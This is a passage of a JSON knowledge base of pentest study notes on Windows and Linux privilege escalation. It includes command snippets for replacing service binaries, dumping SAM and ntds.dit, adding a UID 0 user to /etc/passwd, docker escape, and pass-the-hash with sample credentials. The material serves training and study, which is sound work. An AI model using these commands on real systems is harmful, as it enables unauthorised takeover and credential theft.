        "command": "icacls \"C:\\xampp\\mysql\\bin\\mysqld.exe\""
      },
      {
        "language": "bash",
        "command": "x86_64-w64-mingw32-gcc adduser.c -o adduser.exe"
      },
      {
        "language": "powershell",
        "command": "move .\\adduser.exe C:\\xampp\\mysql\\bin\\mysqld.exe"
      },
      {
        "language": "powershell",
        "command": "shutdown /r /t 0"
      }
    ],
    "related_cves": [],
    "source_file": "ZNote-Windows-Privileges.md"
  },
  {
    "id": "winprivesc_unquoted_service_path_vector",
    "category": "Windows Privilege Escalation",
    "title": "WinPrivesc Vector: Unquoted Service Path",
    "content": "Identify services with unquoted paths containing spaces using `wmic` or PowerShell (`Get-CimInstance`). Check write permissions (`icacls`) in the directories along the path (e.g., `C:\\Program Files\\`, `C:\\Program Files\\My Program\\`). Place a payload named appropriately (e.g., `Program.exe`, `My.exe`) in a writable directory earlier in the path. Restart the service to trigger execution. PowerUp (`Get-UnquotedServicePath`) or PowerView (`Get-UnquotedService`) can automate detection.",
    "tags": [
      "windows",
      "privesc",
      "service_exploitation",
      "unquoted_service_path",
      "insecure_permissions",
      "wmic",
      "icacls",
      "powerup",
      "powerview"
    ],
    "code_snippets": [
      {
        "language": "powershell",
        "command": "wmic service get name,displayname,pathname,startmode |findstr /i \"auto\" |findstr /i /v \"c:\\windows\\\""
      }
    ],
    "related_cves": [],
    "source_file": "ZNote-Windows-Privileges.md"
  },
  {
    "id": "winprivesc_scheduled_tasks_vector",
    "category": "Windows Privilege Escalation",
    "title": "WinPrivesc Vector: Scheduled Tasks",
    "content": "List scheduled tasks using `schtasks /query /fo LIST /v` or `Get-ScheduledTask`. Look for tasks running as a higher privilege user (`RunAs`) where the executable (`TaskToRun`) is in a location writable by the current user (`icacls`). Replace the executable with a payload and wait for the task's trigger.",
    "tags": [
      "windows",
      "privesc",
      "scheduled_tasks",
      "schtasks",
      "get-scheduledtask",
      "insecure_permissions"
    ],
    "code_snippets": [
      {
        "language": "powershell",
        "command": "schtasks /query /fo LIST /v"
      },
      {
        "language": "powershell",
        "command": "Get-ScheduledTask | where {$_.TaskPath -notlike  \"\\Microsoft*\"} | ft TaskName,TaskPath,State"
      }
    ],
    "related_cves": [],
    "source_file": "ZNote-Windows-Privileges.md"
  },
  {
    "id": "winprivesc_dll_hijacking_vector",
    "category": "Windows Privilege Escalation",
    "title": "WinPrivesc Vector: DLL Hijacking",
    "content": "Identify applications running with higher privileges that load DLLs from insecurely permissioned directories. Replace a legitimate DLL with a malicious one (payload) to achieve code execution in the context of the application.",
    "tags": [
      "windows",
      "privesc",
      "dll_hijacking",
      "insecure_permissions"
    ],
    "code_snippets": [],
    "related_cves": [],
    "source_file": "ZNote-Windows-Privileges.md"
  },
  {
    "id": "winprivesc_other_vectors",
    "category": "Windows Privilege Escalation",
    "title": "WinPrivesc Vectors: Other Methods",
    "content": "Other paths include: exploiting vulnerable applications, kernel exploits, abusing Windows privileges (`whoami /priv`) like `SeImpersonatePrivilege` (using tools like PrintSpoofer, SigmaPotato, Juicy/God Potato) or others (`SeBackupPrivilege`, `SeLoadDriver`, etc.), leveraging Windows Subsystem for Linux (WSL), UAC bypass techniques, finding credentials in web config files (`web.config`), exploiting writable Startup folders, or dumping SAM/SYSTEM/ntds.dit hives (`reg save`, `impacket-secretsdump`).",
    "tags": [
      "windows",
      "privesc",
      "kernel_exploit",
      "privilege_abuse",
      "seimpersonateprivilege",
      "sebackupprivilege",
      "juicy_potato",
      "godpotato",
      "printspoofer",
      "wsl",
      "uac_bypass",
      "web.config",
      "startup_folder",
      "sam_dump",
      "ntds.dit"
    ],
    "code_snippets": [
      {
        "language": "powershell",
        "command": "whoami /priv"
      },
      {
        "language": "powershell",
        "command": ".\\PrintSpoofer64.exe -c \"cmd /c powershell -c C:\\Windows\\Tasks\\craft.ps1\""
      },
      {
        "language": "powershell",
        "command": "type C:\\inetpub\\wwwroot\\web.config | findstr connectionString"
      },
      {
        "language": "powershell",
        "command": "reg save HKLM\\SAM C:\\Users\\Public\\SAM"
      },
      {
        "language": "powershell",
        "command": "copy C:\\Windows\\NTDS\\ntds.dit C:\\Users\\Public\\ntds.dit"
      }
    ],
    "related_cves": [],
    "source_file": "ZNote-Windows-Privileges.md"
  },
  {
    "id": "winprivesc_automated_enum",
    "category": "Windows Privilege Escalation",
    "title": "WinPrivesc Automated Enum",
    "content": "Use automated enumeration scripts like `WinPEAS.exe`, `PowerUp.ps1` (`Invoke-AllChecks`), or `PowerView.ps1` (`Invoke-AllChecks`) to quickly identify potential privilege escalation vectors.",
    "tags": [
      "windows",
      "privesc",
      "enumeration",
      "automated_enum",
      "winpeas",
      "powerup",
      "powerview",
      "invoke-allchecks"
    ],
    "code_snippets": [
      {
        "language": "powershell",
        "command": ".\\WinPEAS.exe"
      },
      {
        "language": "powershell",
        "command": "Invoke-AllChecks"
      }
    ],
    "related_cves": [],
    "source_file": "ZNote-Windows-Privileges.md"
  },
  {
    "id": "winprivesc_direct_access_methods",
    "category": "Windows Privilege Escalation",
    "title": "WinPrivesc: Direct Access Methods (with Creds/Hash)",
    "content": "Once valid credentials (username/password or NTLM hash) are obtained, gain direct interactive access using: `xfreerdp3` (RDP), `evil-winrm` (WinRM), `impacket-psexec` (SMB - SYSTEM shell), or `impacket-wmiexec` (WMI - user shell).",
    "tags": [
      "windows",
      "privesc",
      "lateral_movement",
      "rdp",
      "xfreerdp3",
      "winrm",
      "evil-winrm",
      "smb",
      "wmi",
      "impacket-psexec",
      "impacket-wmiexec",
      "pass_the_hash"
    ],
    "code_snippets": [
      {
        "language": "bash",
        "command": "xfreerdp3 /u:offsec /p:lab /v:<target_ip> /drive:shared,/home/kali/Desktop/"
      },
      {
        "language": "bash",
        "command": "evil-winrm -i <target_ip> -u \"daveadmin\" -p \"qwertqwertqwert123\!\!\""
      },
      {
        "language": "bash",
        "command": "impacket-psexec -hashes :7a38310ea6f0027ee955abed1762964b Administrator@<target_ip>"
      }
    ],
    "related_cves": [],
    "source_file": "ZNote-Windows-Privileges.md"
  },
  {
    "id": "linuxprivesc_manual_kernel_exploit",
    "category": "Linux Privilege Escalation",
    "title": "LinuxPrivesc Manual Enum: Kernel Exploit",
    "content": "Check kernel version (`uname -a`, `uname -r`, `cat /proc/version`) and OS details (`cat /etc/issue`, `/etc/os-release`). Search for known local privilege escalation exploits matching the kernel version. This method should generally be considered last.",
    "tags": [
      "linux",
      "privesc",
      "enumeration",
      "manual_enum",
      "kernel_exploit",
      "uname",
      "searchsploit"
    ],
    "code_snippets": [
      {
        "language": "bash",
        "command": "uname -a"
      },
      {
        "language": "bash",
        "command": "cat /etc/issue"
      }
    ],
    "related_cves": [],
    "source_file": "ZNote-Linux-Privileges.md"
  },
  {
    "id": "linuxprivesc_manual_writable_files",
    "category": "Linux Privilege Escalation",
    "title": "LinuxPrivesc Manual Enum: Writable Files/Directories",
    "content": "Use `find / -writable -type f` and `find / -writable -type d` to locate world-writable or group-writable files/directories. Pay special attention to critical files like `/etc/passwd`, `/etc/shadow`, `/etc/sudoers`. If `/etc/passwd` is writable, you can add a new root user (UID 0) by generating a password hash (`openssl passwd <pass>`) and appending a new line (`echo \"root2:<hash>:0:0:...\" >> /etc/passwd`).",
    "tags": [
      "linux",
      "privesc",
      "enumeration",
      "manual_enum",
      "insecure_permissions",
      "writable_files",
      "find",
      "etc_passwd",
      "openssl"
    ],
    "code_snippets": [
      {
        "language": "bash",
        "command": "find / -writable -type f 2>/dev/null"
      },
      {
        "language": "bash",
        "command": "openssl passwd w00t"
      },
      {
        "language": "bash",
        "command": "echo \"root2:Fdzt.eqJQ4s0g:0:0:root:/root:/bin/bash\" >> /etc/passwd"
      }
    ],
    "related_cves": [],
    "source_file": "ZNote-Linux-Privileges.md"
  },
  {
    "id": "linuxprivesc_manual_suid_guid_caps",
    "category": "Linux Privilege Escalation",
    "title": "LinuxPrivesc Manual Enum: SUID/GUID/Capabilities",
    "content": "Find SUID (`find / -perm -4000`) and SGID (`find / -perm -2000`) binaries. Check for file capabilities (`getcap -r / 2>/dev/null`), especially `cap_setuid+ep`. Look up identified binaries and capabilities on GTFOBins for exploitation techniques.",
    "tags": [
      "linux",
      "privesc",
      "enumeration",
      "manual_enum",
      "suid",
      "sgid",
      "capabilities",
      "find",
      "getcap",
      "gtfobins"
    ],
    "code_snippets": [
      {
        "language": "bash",
        "command": "find / -perm -4000 -type f 2>/dev/null"
      },
      {
        "language": "bash",
        "command": "getcap -r / 2>/dev/null"
      }
    ],
    "related_cves": [],
    "source_file": "ZNote-Linux-Privileges.md"
  },
  {
    "id": "linuxprivesc_manual_sudo",
    "category": "Linux Privilege Escalation",
    "title": "LinuxPrivesc Manual Enum: Sudo",
    "content": "Check configured sudo permissions using `sudo -l`. Examine the `/etc/sudoers` file for misconfigurations. Check GTFOBins for ways to abuse allowed sudo commands to gain a root shell. Try `sudo -u#-1 /bin/bash`.",
    "tags": [
      "linux",
      "privesc",
      "enumeration",
      "manual_enum",
      "sudo",
      "sudoers",
      "sudo_l",
      "gtfobins"
    ],
    "code_snippets": [
      {
        "language": "bash",
        "command": "sudo -l"
      },
      {
        "language": "bash",
        "command": "sudo -u#-1 /bin/bash"
      }
    ],
    "related_cves": [],
    "source_file": "ZNote-Linux-Privileges.md"
  },
  {
    "id": "linuxprivesc_manual_cron",
    "category": "Linux Privilege Escalation",
    "title": "LinuxPrivesc Manual Enum: Cron Jobs",
    "content": "Check user (`crontab -l`) and system (`cat /etc/crontab`, `ls -lah /etc/cron*`) cron jobs. Examine cron logs (`/var/log/cron.log`, `/var/log/syslog`). Look for jobs running scripts with insecure permissions (writable by current user) and modify them to execute payloads.",
    "tags": [
      "linux",
      "privesc",
      "enumeration",
      "manual_enum",
      "cron",
      "crontab",
      "insecure_permissions"
    ],
    "code_snippets": [
      {
        "language": "bash",
        "command": "crontab -l"
      },
      {
        "language": "bash",
        "command": "cat /etc/crontab"
      },
      {
        "language": "bash",
        "command": "ls -lah /etc/cron*"
      },
      {
        "language": "bash",
        "command": "grep \"CRON\" /var/log/syslog"
      }
    ],
    "related_cves": [],
    "source_file": "ZNote-Linux-Privileges.md"
  },
  {
    "id": "linuxprivesc_manual_password_loot",
    "category": "Linux Privilege Escalation",
    "title": "LinuxPrivesc Manual Enum: Password Looting",
    "content": "Monitor processes for plaintext passwords (`watch -n 1 \"ps -aux | grep pass\"`). Sniff network traffic, especially loopback, for credentials (`sudo tcpdump -i lo -A | grep \"pass\"`). Check user home directories for SSH keys (`~/.ssh`, `find / -name id_rsa`, `find / -name authorized_keys`).",
    "tags": [
      "linux",
      "privesc",
      "enumeration",
      "manual_enum",
      "credential_hunting",
      "process_monitoring",
      "tcpdump",
      "ssh_keys"
    ],
    "code_snippets": [
      {
        "language": "bash",
        "command": "watch -n 1 \"ps -aux | grep pass\""
      },
      {
        "language": "bash",
        "command": "find / -name id_rsa 2> /dev/null"
      }
    ],
    "related_cves": [],
    "source_file": "ZNote-Linux-Privileges.md"
  },
  {
    "id": "linuxprivesc_manual_other",
    "category": "Linux Privilege Escalation",
    "title": "LinuxPrivesc Manual Enum: Other Methods",
    "content": "Check environment variables (`env`), shell configuration files (`.bashrc`), and history (`.bash_history`, `history`) for leaked credentials. Examine running processes (`ps -aux`) for high-privilege applications. Look for sensitive information in web server directories (`/var/www/html`). Check for Docker misconfigurations allowing escape (`docker run -v /:/mnt ...`). Check NFS shares for root squashing issues.",
    "tags": [
      "linux",
      "privesc",
      "enumeration",
      "manual_enum",
      "credential_hunting",
      "env",
      "bashrc",
      "bash_history",
      "ps",
      "docker_escape",
      "nfs"
    ],
    "code_snippets": [
      {
        "language": "bash",
        "command": "env"
      },
      {
        "language": "bash",
        "command": "history"
      },
      {
        "language": "bash",
        "command": "docker run -v /:/mnt --rm -it alpine chroot /mnt sh"
      }
    ],
    "related_cves": [],
    "source_file": "ZNote-Linux-Privileges.md"
  },
  {
    "id": "linuxprivesc_automated_enum",
    "category": "Linux Privilege Escalation",
    "title": "LinuxPrivesc Automated Enum",
    "content": "Use automated enumeration scripts like `linpeas.sh`, `linux-exploit-suggester.sh`, or `unix-privesc-check.sh`. Use process monitoring tools like `pspy` to find frequently running tasks or cron jobs. Remember to make scripts executable (`chmod +x`).",
    "tags": [
      "linux",
      "privesc",
      "enumeration",
      "automated_enum",
      "linpeas",
      "linux-exploit-suggester",
      "unix-privesc-check",
      "pspy",
      "tool"
    ],
    "code_snippets": [
      {
        "language": "bash",
        "command": "./linpeas.sh"
      },
      {
        "language": "bash",
        "command": "./linux-exploit-suggester.sh"
      },
      {
        "language": "bash",
        "command": "./pspy64"
      }
    ],
    "related_cves": [],
    "source_file": "ZNote-Linux-Privileges.md"
  }

];